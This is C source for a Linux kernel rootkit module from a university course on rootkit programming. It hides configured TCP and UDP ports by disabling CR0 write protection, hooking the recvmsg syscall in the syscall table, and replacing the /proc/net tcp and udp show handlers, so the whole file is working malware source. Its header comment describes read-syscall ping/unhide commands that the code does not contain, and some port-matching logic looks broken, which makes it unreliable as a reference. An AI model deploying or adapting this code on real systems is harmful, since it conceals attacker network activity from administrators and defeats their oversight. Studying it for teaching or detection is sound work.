
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 6                                                             */
/*                                                                             */
/*   Filename: socket_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: This module is hiding itself in the kernel context. Specifically,  */
/*          it does not show up in /sys/module or in the output of lsmod.      */
/*          Additionaly, it hooks the read system call and if the user types   */
/*          `ping` the rootkit responds with `pong` in the kernel log. This    */
/*          mecahnism is used to check if the rootkit is running. In order to  */
/*          unload the module, the module needs to become visible again.       */
/*          Therefore, the read system call is hooked to look for yet another  */
/*          command, called `unhide`, which makes the module visible.          */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_recvmsg */
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet_diag.h>
#include <linux/types.h>

#include "socket_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("An evil rootkit. It hides sockets :)") ;
MODULE_VERSION("0.1");
MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>") ;
MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");

module_param_array(tcp_ports, int, &tcp_ports_count, 0);
MODULE_PARM_DESC(tcp_ports, "TCP ports");
module_param_array(udp_ports, int, &udp_ports_count, 0);
MODULE_PARM_DESC(udp_ports, "UDP ports");
module_param_array(tcp6_ports, int, &tcp6_ports_count, 0);
MODULE_PARM_DESC(tcp6_ports, "TCPv6 ports");
module_param_array(udp6_ports, int, &udp6_ports_count, 0);
MODULE_PARM_DESC(udp6_ports, "UDPv6 ports");


/* Initialization function which is called when the module is
   insmoded into the kernel. It ... */
static int __init socket_masker_start(void)
{
	int i;

	if (!tcp_ports_count && !udp_ports_count && !tcp6_ports_count && !udp6_ports_count) {
		PRINT("insmod socket_masker.ko [tcp_ports=port1,port2,...] [udp_ports=port1,port2,...] [tcp6_ports=port1,port2,...] [udp6_ports=port1,port2,...]");
		/* A non 0 return value means init_module failed; module can't be loaded */
		return -EINVAL;
	}

	// TODO: check if ports are in specific set [1024...]

	if (tcp_ports_count) {
		disable_write_protect_mode();

		/* Store original read recvmsg address */
		syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
		original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];

		/* Overwrite manipulated read syscall */
		syscall_table[__NR_recvmsg] = (unsigned long *) my_recvmsg_syscall;

		enable_write_protect_mode();
	}

	hide_sockets();

	for (i=0 ; i<tcp_ports_count ; i++)
		printk(KERN_INFO "socket_masker rootkit: tcp_ports[%d] = %d\n", i, tcp_ports[i]);

	for (i=0 ; i<udp_ports_count ; i++)
		printk(KERN_INFO "socket_masker rootkit: udp_ports[%d] = %d\n", i, udp_ports[i]);

	for (i=0 ; i<tcp6_ports_count ; i++)
		printk(KERN_INFO "socket_masker rootkit: tcp6_ports[%d] = %d\n", i, tcp6_ports[i]);

	for (i=0 ; i<udp6_ports_count ; i++)
		printk(KERN_INFO "socket_masker rootkit: udp6_ports[%d] = %d\n", i, udp6_ports[i]);

	PRINT("successfully inserted");

	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original recvmsg() syscall. */
static void __exit socket_masker_end(void)
{
	if (tcp_ports_count) {
		disable_write_protect_mode();

		/* Restore original recvmsg syscall */
		syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;

		enable_write_protect_mode();
	}

	unhide_sockets();

	PRINT("successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


/* our custom recvmsg, checks for the port number and hides it from ss */
/* Function that replaces the original read syscall. In addition to what
   read syscall does, it also looks for two commands (`ping` and `unhide`).
   When `ping` is typed, it responds with `pong` in the kernel log. When
   `unhide` is typed, it makes the module visible again */
asmlinkage ssize_t my_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
{
	long ret;
	long count;
	struct nlmsghdr *nlh;
	char *stream;
	int i;
	int found = 0;
	int offset;

	PRINT("my_recvmsg_syscall");
	nlh = (struct nlmsghdr*)(msg->msg_iov->iov_base);
	
	/* Call original recvmsg syscall */
	ret = original_recvmsg_syscall(sockfd, msg, flags);

	// to hold the bytes remaining
    count = ret;
	found = 1;

	/* returns true if netlink message is suitable for parsing */
	while (NLMSG_OK(nlh, count)) {

		/* if port is not found, get the next nlmsghsr in multipart message */
		if (found == 0)
			nlh = NLMSG_NEXT(nlh, count);

		stream = (char *) nlh;

		if (hide(nlh)) {
			found = 1;
			offset = NLMSG_ALIGN((nlh)->nlmsg_len);
			for (i=0 ; i<count ; ++i)
				stream[i] = stream[i + offset];

			ret -= offset;
		} else
			found = 0;
	}
	
	return ret;
}


/*
 * check if we need to hide this socket.
 * only used by our manipulated recvmsg function.
 */
static int hide(struct nlmsghdr *nlh)
{
	struct inet_diag_msg *r = NLMSG_DATA(nlh);
	int port = ntohs(r->id.idiag_sport);

	if (should_mask_socket("tcp", port))
		return 1;

	return 0;
}


/* Hide sockets... */
void hide_sockets(void)
{
	struct proc_dir_entry *some;
	struct rb_root proc;
	struct rb_node *proc_node;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

	PRINT("hide_sockets");

	proc = init_net.proc_net->subdir;
	proc_node = rb_first(&proc);
	printk(KERN_INFO "socket_masker rootkit: whateva (%p) \n", proc_node);
	printk(KERN_INFO "socket_masker rootkit: whateva2 (%s) \n", init_net.proc_net->name);
	while (proc_node != rb_last(&proc)) {
		some = rb_entry(proc_node, struct proc_dir_entry, subdir_node);
		PRINT(some->name);
		if (tcp_ports_count && !strcmp(some->name, "tcp")) {
			tcp_seq = some->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = my_tcp_show;
		}

		if (udp_ports_count && !strcmp(some->name, "udp")) {
			udp_seq = some->data;
			original_udp_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = my_udp_show;
		}

		if (tcp6_ports_count && !strcmp(some->name, "tcp6")) {
			tcp_seq = some->data;
			original_tcp6_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = my_tcp_show;
		}

		if (udp6_ports_count && !strcmp(some->name, "udp6")) {
			udp_seq = some->data;
			original_udp6_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = my_udp_show;
		}

		proc_node = rb_next(proc_node);
	}
}


/* Unhide sockets... */
void unhide_sockets(void)
{
	struct proc_dir_entry *some;
	struct rb_root proc;
	struct rb_node *proc_node;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

	PRINT("unhide_sockets");

	proc = init_net.proc_net->subdir;
	proc_node = rb_first(&proc);
	printk(KERN_INFO "socket_masker rootkit: whateva (%p) \n", proc_node);
	printk(KERN_INFO "socket_masker rootkit: whateva2 (%s) \n", init_net.proc_net->name);
	while (proc_node != rb_last(&proc)) {
		some = rb_entry(proc_node, struct proc_dir_entry, subdir_node);
		PRINT(some->name);
		if (tcp_ports_count && !strcmp(some->name, "tcp")) {
			tcp_seq = some->data;
			tcp_seq->seq_ops.show = original_tcp_show;
		}

		if (udp_ports_count && !strcmp(some->name, "udp")) {
			udp_seq = some->data;
			udp_seq->seq_ops.show = original_udp_show;
		}

		if (tcp6_ports_count && !strcmp(some->name, "tcp6")) {
			tcp_seq = some->data;
			tcp_seq->seq_ops.show = original_tcp_show;
		}

		if (udp6_ports_count && !strcmp(some->name, "udp6")) {
			udp_seq = some->data;
			udp_seq->seq_ops.show = original_udp_show;
		}

		proc_node = rb_next(proc_node);
	}

}


/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int my_tcp_show(struct seq_file *m, void *v)
{
	struct sock *sk;
	struct inet_sock *inet;
	int port;

	PRINT("my_tcp_show");

	if (SEQ_START_TOKEN == v)
		return original_tcp_show(m, v);

	sk = (struct sock *) v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	if (should_mask_socket("tcp", port))
		return 0;

	return original_tcp_show(m, v);
}


/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int my_udp_show(struct seq_file *m, void *v)
{
	struct sock *sk;
	struct inet_sock *inet;
	int port;

	PRINT("my_udp_show");

	if(SEQ_START_TOKEN == v)
		return original_udp_show(m, v);

	sk = (struct sock *) v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	if (should_mask_socket("udp", port))
		return 0;

	return original_udp_show(m, v);
}


/* Function that checks whether we need to mask the specified pid */
int should_mask_socket(char *protocol, int port)
{
	int ports_count;
	int *ports;
	int i;

	if (!strcmp(protocol, "tcp") && !strcmp(protocol, "udp"))
		return 0;

	ports_count = strcmp(protocol, "tcp") ? tcp_ports_count : udp_ports_count;
	ports = strcmp(protocol, "tcp") ? tcp_ports : udp_ports;

	for (i=0 ; i<ports_count ; i++)
		if (ports[i] == port)
			return 1;

	return 0;
}


module_init(socket_masker_start);
module_exit(socket_masker_end);
